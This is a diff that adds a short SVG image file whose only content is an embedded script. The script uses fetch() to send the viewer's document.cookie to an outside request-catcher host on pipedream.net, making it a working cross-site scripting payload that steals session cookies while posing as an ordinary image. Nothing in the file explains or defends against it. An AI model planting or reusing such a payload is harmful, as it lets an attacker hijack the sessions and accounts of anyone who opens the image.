@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+    <script>
+        fetch("https://enmz6ozs7du1q.x.pipedream.net/?satoki="+document.cookie);
+    </script>
+</svg>
